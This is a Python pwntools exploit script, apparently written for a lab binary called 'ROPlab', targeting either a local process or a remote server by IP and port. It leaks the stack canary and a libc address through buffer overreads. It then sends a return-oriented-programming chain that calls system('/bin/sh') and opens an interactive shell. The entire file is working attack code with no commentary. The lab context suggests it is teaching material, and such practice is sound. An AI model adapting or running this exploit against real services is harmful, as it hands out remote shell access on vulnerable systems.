from pwn import *

localhost = True

if localhost:
    #libc-2.27.so
    libc_start_main = 0x21b10
    libc_ret = 0x8aa
    libc_system = 0x4f550
    libc_bin_sh = 0x1b3e1a
    libc_pop_rdi = 0x215bf
    server = process('./sourcecode/ROPlab')
    offset = 231
else:
    #libc-2.29.so
    libc_start_main = 0x26a80
    libc_ret = 0x2535f
    libc_system = 0x52fd0
    libc_bin_sh = 0x1afb84
    libc_pop_rdi = 0x26542
    server = remote('140.112.31.97',30102)
    offset = 235
    
server.sendafter('name : ','a'*0x19)
server.recvuntil('a'*0x19)
nonce = b'\x00'+server.recv(7)

server.sendafter('here : ','a'*0x28)
server.recvuntil('a'*0x28)
libc_base = u64(server.recv(6)+b'\x00\x00') - offset - libc_start_main

payload = b'a'*0x18 + nonce + p64(0) + p64(libc_base + libc_pop_rdi) + p64(libc_base + libc_bin_sh) + p64(libc_base + libc_ret) + p64(libc_base + libc_system)
server.sendafter('remarks? ',payload)
server.recvuntil('feedback')

server.interactive()